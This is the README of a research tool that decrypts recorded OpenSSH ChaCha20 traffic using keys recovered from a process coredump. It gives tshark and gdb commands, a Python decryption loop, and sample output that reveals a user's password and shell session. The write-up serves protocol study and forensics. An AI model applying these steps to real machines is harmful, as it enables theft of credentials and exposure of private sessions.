# ssh_decrypt

This is a module to decrypt SSH network traffic given a coredump of
the client or server process with the connection still up.

This is not an attempt to break SSH under its intended threat model.
Rather, it is an attack to see how, when the assumptions of that model
are violated (and thus security is no longer guaranteed), we can
actually compromise the protocol in practice.  In particular, while
this attack may have some forensic or rootkit applications, it does
not on its own imply any weakness as such in either the SSH protocol
or in any existing implementation.  Our goal was simply to better
understand the protocol and its use of cryptographic primitives.


## Threat model

Here we outline under what specific assumptions our attack will work
and present hypothetical real-world scenarios that satisfy those
assumptions.

### Target

The target is the plaintext traffic of an SSH connection between a
client and a server.

### Assumptions

For this attack, we assume the attacker can obtain the following
information:

* A snapshot of memory while the target SSH connection is active
  (meaning a snapshot, either on the client or the server, of physical
  memory or of the virtual memory of the SSH process).

* A packet capture including the network traffic involved in the ssh
  session

### Real scenarios

This situation could occur in the real world in a couple of ways:

* The attacker is root on the client or server.  In such a situation,
  the attacker could theoretically just replace the ssh binary with a
  malicious one that steals passwords/session content, but that
  requires modifying data on the hard disk.  This technique can be
  deployed without touching the hard disk.

  There is also an edge case here: The "replace the ssh binary" method
  does not permit visibility into sessions that already existed at the
  moment of compromise.

* The attacker gains physical access to either the client or server.
  In that case, there are techniques for connecting a device to a
  PCIe, PCMCIA, or Firewire port to acquire a dump of memory without
  requiring any credentials.


## SSH protocol

Before describing the attack, it will help to have some background in
the SSH protocol itself.  For a more complete description of this
protocol, we refer interested readers to

* RFC 4251 for the protocol architecture
* RFC 4252 for the authentication protocol details
* RFC 4253 for the transport protocol details
* RFC 4254 for the connection protocol details

Here, we present a summary of what happens in a typical ssh session:

* Key exchange (RFC 4253 section 7)

  In this step, the server and client agree on a random key for later
  use in symmetric encryption.  This is done without transmitting the
  key over the (untrusted) network by any of a number of key-exchange
  algorithms designed exactly for this purpose (e.g. Diffie-Hellman).

  During this step, two other things happen:

  * The server and client negotiate the various crypto algorithms they
    will need (for message signing, server authentication, symmetric
    encryption, etc.)

  * The server will (in most cases) also provide a signature of
    identifying information that the client can verify using the
    server's public key, thereby authenticating the server to the
    client as the one they in fact intended to securely connect to.

  Once this is complete, all traffic will be encrypted according to
  the negotiated symmetric cipher.  Though these ciphers are in
  general well-known and accepted algorithms, their use in the SSH
  protocol must be specifically prescribed through other RFCs.
  Algorithms may require additional parameters--padding,
  initialisation vectors, etc., and such RFCs ensure all clients and
  servers agree on a particular (secure) convention for choosing
  these.

  There are, however, a few common features among the uses of
  symmetric encryption:

  * To avoid leaking information by length data, random padding is
    added to every plaintext payload,

  * The length of the actual payload is encrypted with a separate
    symmetric key from that used to encrypt the payload itself and is
    a part of the message.

* Client Authentication (RFC 4252 sections 7, 8)

  Now that the communication is safe, the server needs to verify that
  the client is allowed to access the shell.  They do this through
  either a public key authentication mechanism (where the client
  proves by sending an appropriate signature that they possess the
  private key corresponding to a public key that the server knows is
  approved for access) or else by sending a valid password.

  The signature or the password is encrypted using the symmetric key
  encryption algorithm 

* Channel creation/teardown (RCF 4254 sections 5, 6)

  The main body of communication happens over "channels", which are
  created and can be allocated pseudo-terminals (for interactive
  sessions) and X11 sessions (for X forwarding), among other things.

## The attack in theory

Having understood the protocol, the basic steps for decrypting it
under the given assumptions should not be surprising:

* Extract the encrypted traffic from the packet capture

* Extract the symmetric keys from the memory dump

* Identify the symmetric cipher employed from the memory dump

* Take the keys and use an application of the cipher that matches that
  employed by the ssh client/server in the communication to decrypt
  the traffic.

* Optionally, verify the MAC on each message (to see which messages
  are actually valid and which are not)


## The attack in practice

Some of these steps are as straightforward as they sound, while others
required some work:

* Extracting encyrypted traffic

  * `tshark` has a display filter for doing precisely this.

* Searching memory for the keys:

  * Since the keys are just a sequence of several integers, it may not
    be obvious how to identify them within the memory dump.  This we
    have to write custom code for.

* Identifying the cipher:

  * This is expressed as a string, which is fairly easy to spot in
    memory.

* Using the keys to decrypt:

  * The implementations of the various symmetric encryption algorithms
    within ssh are documented in RFCs that we will need to implement.
    These RFCs refer to primitives of the crypto algorithm that we
    have to understand, often by reading the RFCs that define the
    cryptographic functions themselves.


## Example: Decrypting chacha20-encrypted traffic from OpenSSH 7.5

### Setup

We have three files:

* `ssh.pcap`: The packet capture of the ssh session of interest

* `ssh.core`: A coredump of the ssh process while the session is
  running

* `ssh`: The actual ssh binary used in the connection.  For
  simplicity, this is be compiled with debug symbols.

We are positioned on the client, and have the full privileges of that
client.  

### Extracting encrypted traffic

The program tshark has display filters for ssh fields:

```
tshark -n -r ssh.pcap -T fields -e ip.src -e ip.dst -e ssh.packet_length_encrypted -e ssh.encrypted_packet
```

We can clean up this data a bit and save it to a file, `data/traffic`.

### Searching memory for the keys

In openssh, a perusal of the source code reveals that the global
variable `active_state`, and in particular its `state` field, stores
all the information about the current connection.  For example,
`active_state->state->send_context` contains all the information
needed to send data (including the cipher and key used to encrypt data
being sent), and `active_state->state->receive_context` likewise for
receiving data.  In particular, the keys for sent data and received
data are usually different, and the ciphers may in principle also be
different.

Both of these context structs are of type `struct sshcipher_ctx`, and
have a field called `cipher` (pointing to a `struct sshcipher`)
describing the cipher, and three fields for the actual current state
of that cipher:

* `evp`: This points to the structure storing the state of the cipher
  if the cipher came from the OpenSSL library.

* `cp_ctx`: This points to a `struct chachapoly_ctx`, which stores the
  chacha20-specific state information in the case that chacha20 is the
  symmetric cipher in use.

* `aesctr_ctx`: This points to a `struct aesctr_ctx`, which stores the
  AES-CTR-specific state information in the case that AES in CTR mode
  is the symmetric cipher in use and the implementation of AES-CTR in
  OpenSSL is not used (for example, if OpenSSH was compiled without
  OpenSSL).

Since we are in the case where chacha20 is being used, cp_ctx has all
the information we need.  Within this struct, the `header_ctx` field
contains the key (in its `input` field) for decrypting the length of
each payload, and the `main_ctx` field has the key for decrypting the
payload itself.

Since our binary has symbols, we can load the core file into gdb and
simply print these keys out:

```
p active_state->state->send_context->cp_ctx->header_ctx->input
p active_state->state->send_context->cp_ctx->main_ctx->input
p active_state->state->receive_context->cp_ctx->header_ctx->input
p active_state->state->receive_context->cp_ctx->main_ctx->input
```

Specifically, placing this into a script `ssh_gdb`, we do:

```
gdb ssh ssh.core <ssh_gdb
```

After massaging the output of this a little, say we save it in `data/keys`

### Identifying the cipher

Though we've already said that we're in a situation where the only
cipher in use is chacha20, we can easily observe the sned and receive
cipher names using gdb by:

```
p active_state->state->send_context->cipher->name
p active_state->state->receive_context->cipher->name
```

We note that only the `active_state` struct is needed for this, so in
the case where symbols are not present, our only worry is locating
this struct, from which point we can follow the train of pointers
contained therein to the data we seek.

### Using the keys to decrypt

If we are handed a pile of AES-CTR encrypted message and the key that
was used to encrypt them, that is in general not enough to
successfully decrypt: We also need the IV used to start the encryption
(which is normally not kept secret).

In our case, we likewise need to understand the parameters involved in
the chacha20 encryption algorithm.

#### Intro to ChaCha20

The ChaCha20 algorithm (along with the Poly1305 MAC function) is
described in RFC 7539.  

In brief, just like AES-CTR, ChaCha20 has a block encryption function,
which is used to repeatedly encrypt an incrementing counter as the
"message", and then this encrypted counter data is XORed with the
plaintext to give the ciphertext.  Also, just like in AES-CTR, there
is a nonce used to add some randomness so that when we start a new
stream with a freshly zeroed counter and new nonce, we don't have the
same output:

```
ChaCha20_block(key, counter, nonce)
```

This function constructs a 16-word (here, a word is considered as 32
bits) state vector as:

```
0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, {8 word key}, {1 word counter}, {3 word nonce}
```

(Note that these constants are the encoding of the magic string
"expand 32-byte k".)  It then mangles this using mathematical
operations and outputs the 64-byte result.

This 64-byte state vector is the thing we extract from memory.  In
particular, we have the key as words 4-11.  Words 0-3 are fixed as the
constant, so now we simply need to understand what how the counter and
IV are chosen.  This, of course, is application-specific, so we need
to look at ChaCha20 is used in OpenSSH.

#### ChaCha20 in OpenSSH

The use of ChaCha20 in OpenSSH specifically is described in [this
4-page draft
RFC](https://tools.ietf.org/html/draft-josefsson-ssh-chacha20-poly1305-openssh-00).

In brief, the payload length and the actual (padded) payload data are
encrypted with separate instances of the cipher, so we need to know the keys, starting counters, and nonces used in these.

* The keys are words 4-11 of the data we extracted from memory above.
  For example, words 4-11 of
  `active_state->state->send_context->cp_ctx->header_ctx->input` are
  the key used to encrypt the lengths of sent payloads, and words 4-11
  of `active_state->state->send_context->cp_ctx->main_ctx->input`
  comprise the key use dto encrypt the data being sent.

* The counter for encrypting the lengths always starts at 0, and the
  counter for encrypting the data always starts at 1.

* The nonce for encrypting a given length and payload is the same, and
  is defined as the "packet sequence number" (which is separate from
  the packet's TCP sequence number): The ith SSH packet sent has
  sequence number i, and likewise the ith SSH packet received has
  sequence numnber i (so we have two separate incrementing "sequence
  number" counters--one for sent packets and one for received
  packets--that give use the nonces to decrypt the packets in
  question).

#### Decrypting the data

At this point, the long-overdue punchline is clear: We extract the
keys from memory as words 4-11 of the structures we dumped earlier,
keep track of the incrementing sequence numbers for sent and received
packets, and then we have enough information to build the full state
vectors for decrypting each packet:

```
{encoding of "expand 32-byte k"}{key extracted from memory}{1-word counter (0 for length, 1 for data)}{3-word packet sequence number}
```

For example, in Python with some functionality elided, we can decrypt
all the transmitted data like (supposing txh and txd are the extracted
state vectors for the length and data, respectively):

```
def dec(c, l, state, counter, iv):
    state[12] = counter
    state[15] = iv
    return chacha20.decrypt_bytes(state,c,l)

for i in range(len(tx_data)):
    l = int.from_bytes(dec(tx_data[i]['encrypted_length'], 4, txh, 0, j),'big')
    d = bytes(dec(tx_data[i]['encrypted_data'], l, txd, 1, j))
    print(d)
```

An actual example of doing this is contained in `src/ssh_dec.py`, and a
complete example script for decrypting an entire SSH session is found
in `ssh_dec.sh`:

```
$ ./example.sh 
RX b'\x04\x07\x00\x00\x00\x01\x00\x00\x00\x0fserver-sig-algs\x00\x00\x00Wssh-ed25519,ssh-rsa,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521\xbao`$'
TX b'\x06\x05\x00\x00\x00\x0cssh-userauth=\x08\xe3\xa2\xc5\xbf'
RX b'\x06\x06\x00\x00\x00\x0cssh-userauthb\x0e\xa4\xaf\xd7\xd8'
TX b'\x042\x00\x00\x00\x04niko\x00\x00\x00\x0essh-connection\x00\x00\x00\x04none\x1c\xd4*V'
RX b'\x073\x00\x00\x00\x12publickey,password\x00\x9c\xb4\x9f\x98\xb6;E'
TX b":2\x00\x00\x00\x04niko\x00\x00\x00\x0essh-connection\x00\x00\x00\x08password\x00\x00\x00\x00\x19alaskachopinroilmoneypont\xf8\x19\xc6d|\xcc\xd3\x98+K\x16\x91\x0f\xf0\xd8R/72\x95.\x86'\x7fI/\x1a\xd0\x94\xbe\x00+\xba'-\xa4\xec{x\x81\xe2\xdd\x120\x9463[#\xcb@\xfa\xdb\x0b\xf8\xa8I\xfd"
RX b'\x064\xa9u\x01\x83\xef\xbb'
TX b'\x07Z\x00\x00\x00\x07session\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00@\x00\xe8\xa4\xe5\xeb\xa2\xea\x9b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
RX b'\x07P\x00\x00\x00\x17hostkeys-00@openssh.com\x00\x00\x00\x01\x17\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x01\x00\xdf\xfbn\xf7T\x03\t\xbb\x96\xf1\xb6\x13&"\xd4u\xf5b&\xbd\xd2s\xcf\xae*\x8c\x10gbB\xa5\xbc)"\xff\xf9E\xb7\xea\\}4\xaa\x8f\xf5px\x7f@w\x8a\xd0M\xe69W\xd0\xd0e\x0e\x8b\x19\xc0\xce\xa1\x00k\x82o\xbb\xc6Y$\x19n\x1eh\x95\x8d\xbf\xee^>{\x8a\x8cO~w\xe8/O\xb2n\x01\xf5\x05*Dv\x8d\x1d\xe9sF\xd8a\x85\xfc\x12f\x85:b\xdd#m\t\xa4\xde\xb70\xaf\xe6\x11\x8c\x0b\xa7O\xbfTb\xf9U\x90\xe8\xfb\x80\xad\xf1o\x074/\x98\x17g\xca\x1d\x11\xae\xc5\x04J\xf9\x80y+\xc4\xde)2=0\xec\xdc\xf5\xcf\x10N\x0b\x8b\xadZ\xe8\x18\xfa}e-\xe26\xf3"\xa3M\xf6\x0e\xd5E\xde\x8f4\xa1\xaf\xff\x98\xfe\x1e\xd3x\x03\xa1B\xeeW\xa2E\x87\x96\xdf:\r\xfcX\xdc\xf4\xfa\x12\xbb%O*$<{\x00Vy?\x81\xb6\xdd<\r\x06\x98\xd7P\x02\x98Iu\xd3\x14\xedY\xd6\xe0nD[\xef\x9d\x97q\x00\x00\x01\xb1\x00\x00\x00\x07ssh-dss\x00\x00\x00\x81\x00\x8a\xa7\xfb\\C/t\x01\n\xd6\xd5`\xcc\xe2\x9d\x15\x8dU\x9b\xdd\x19\x10\xcd\x97\xcc^\x88`X\xb4j\xda\xd9\xdb\xf3\x85\xe8\xbc\xac\x8e8\x8b\x1a\x83X\xca\xe0\x0e\xbaNM\xe4z\x82\x0f\xd4\xf0/\xa4J\xfa\xc1\x9c\xce\xe6)3 #\x06\x8d\xfe\x85<\xed\xcb\x9b:\xc8\xdc\xd9\xda@\x1f\x0fEY2NY\xcdn\x81\xe6\xa7N\xc1\xd5\nE\xd5s\x89o\x99\x8f1\x1f\x88\xec\x7f\xec\xfd\x11\x92\xdbo\xf2lD\xa8gL\x11:(\x98\'\x00\x00\x00\x15\x00\xb5\x13\xc8\x99fu\xfaH\x86_;\x0e\\6\xcc\x0b\x03\xda\xaf?\x00\x00\x00\x80\x05\xe2\x07\x17\\W\xaei\xeb\x85\xf9\xe8+O\x83\x97v\xe7Dl5\x07\xb7\x8ak*\xb1\xe7\xef\xf9\x94\x17\xf0j\x1a$=\xdf\xb1\xac\x11\xc1\xf2\xccx~e\x1d\x16D\x91\x8cO\xa3\x05k\x00\x93H\xef\x0f\x94\xec\\\xcf\xd0\x0cpL\xadD\xcd\xbbp\x0fg(v\xed\xa6N_\rz]\xf5\xf6a\xd1\xd0B\xf7*\x12\x92cC\xaf:tzZ\x1c\xbe\xfc\x8b[\x8f\x98\xcf\xea\xc7\xe4\xdae\xfbT\xa6\xfc\xd5U|\xb2Q?-\xd8\xa2\x00\x00\x00\x80*-\xa4n\xf6\xab\xe45\xce\x1f\xa4S\xf2\x1f\x1a\xed\xd1\xa9\xf7y\x13UCa\x8a\xed\xc3;\xa4\xefA\x87v\xc1\xfd\x91Q\x83\xa4y\xb39C(}Fd\x9b\xdc\xbe\xe4\x15\xae\x9f\x06\x19\xa0\xbb\xf1\x1e\xc8/\xf1\xa2\x1c\xc0\xbeV\x1a+]\xa4\xf8\x9f\x18\xcc\xcf\xb9\x05x\x86\x16B\xb3\x9a\x82\xb6>0\xf1\x95S\x97o\xae\n\x84)1\x8e\xaa\xddN\xb5\xcd\xfa\xcf\xc1\xa0\xcb\xa8\xc1_c_\x0e\xca\x9f\x9c\xb1\xba\x91\xcb\x1a\xec9\xb4(\x00\x00\x00h\x00\x00\x00\x13ecdsa-sha2-nistp256\x00\x00\x00\x08nistp256\x00\x00\x00A\x04\xe3\x80\xaen\x89\xaf?\xa4\x03s\xf6\xc62 \x11[\xfcr\xc6\x8b".G\xfa\xc5=\xcb\xf38\xba\x95\x9d\x9a{?\x85\xe3C\xf6\xad\xda\x81\xdeYF\x0b\x1f\xa5O\x11_\xef\xeb\x17\xa2\xe6h\xce\xbe\xde\x8e\x86\x80\xcd\x00\x00\x003\x00\x00\x00\x0bssh-ed25519\x00\x00\x00 \x04\xa48X\xd3\xe7\x84\x03e\x15\xc7\xb8\xe0(\xb8\xcbc\xd4Wv--c\xcc\x91\xda\xa8\x14\xc4}\xdc\xa6s\xc1\'Y\xe9>-'
RX b'\x06[\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x14x]\xf6"\xd3'
TX b'\x0bb\x00\x00\x00\x00\x00\x00\x00\x07pty-req\x01\x00\x00\x00\x0exterm-256color\x00\x00\x00\xbd\x00\x00\x002\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x81\x00\x00\x96\x00\x80\x00\x00\x96\x00\x01\x00\x00\x00\x03\x02\x00\x00\x00\x1c\x03\x00\x00\x00\x7f\x04\x00\x00\x00\x15\x05\x00\x00\x00\x04\x06\x00\x00\x00\x00\x07\x00\x00\x00\x00\x08\x00\x00\x00\x11\t\x00\x00\x00\x13\n\x00\x00\x00\x1a\x0c\x00\x00\x00\x12\r\x00\x00\x00\x17\x0e\x00\x00\x00\x16\x12\x00\x00\x00\x0f\x1e\x00\x00\x00\x00\x1f\x00\x00\x00\x00 \x00\x00\x00\x00!\x00\x00\x00\x00"\x00\x00\x00\x00#\x00\x00\x00\x00$\x00\x00\x00\x01%\x00\x00\x00\x00&\x00\x00\x00\x01\'\x00\x00\x00\x00(\x00\x00\x00\x00)\x00\x00\x00\x00*\x00\x00\x00\x012\x00\x00\x00\x013\x00\x00\x00\x014\x00\x00\x00\x005\x00\x00\x00\x016\x00\x00\x00\x017\x00\x00\x00\x018\x00\x00\x00\x009\x00\x00\x00\x00:\x00\x00\x00\x00;\x00\x00\x00\x01<\x00\x00\x00\x01=\x00\x00\x00\x01>\x00\x00\x00\x00F\x00\x00\x00\x01G\x00\x00\x00\x00H\x00\x00\x00\x01I\x00\x00\x00\x00J\x00\x00\x00\x00K\x00\x00\x00\x00Z\x00\x00\x00\x01[\x00\x00\x00\x01\\\x00\x00\x00\x00]\x00\x00\x00\x00\x00\xe1\xf4\xd5\x03i\xd2\xf4\x81\x1db\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
RX b'\nc\x00\x00\x00\x00\x00IS\xc2\xfe\xd8\xce$\xff\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
RX b'\x04^\x00\x00\x00\x00\x00\x00\x00:Last login: Fri May 12 13:06:56 2017 from 10.100.100.25\r\r\nN\xbd\x02\xfe'
RX b'\x06^\x00\x00\x00\x00\x00\x00\x00\x10\x1b]0;niko@www2:~\x07\x80F_\x87G\xec'
RX b'\x07^\x00\x00\x00\x00\x00\x00\x00\x0f[niko@www2 ~]$ \xce5\x1f\x85\x9f\x8f\xe5'
TX b"\x08^\x00\x00\x00\x00\x00\x00\x00Vecho 'Tis hard to say, if greater Want of Skill ; Appear in Writing or in Judging ill'YGZ\xce\xa5\xad\xa6\x99"
RX b"\x08^\x00\x00\x00\x00\x00\x00\x00Vecho 'Tis hard to say, if greater Want of Skill ; Appear in Writing or in Judging ill'\x8e\xe3\xe1(\x02\xcb/\x9e"
TX b'\x05^\x00\x00\x00\x00\x00\x00\x00\x01\r/\xeb\xf9P\xc5'
RX b'\x04^\x00\x00\x00\x00\x00\x00\x00r\r\nTis hard to say, if greater Want of Skill ; Appear in Writing or in Judging ill\r\n\x1b]0;niko@www2:~\x07[niko@www2 ~]$ \x7f\xef\x17,'
```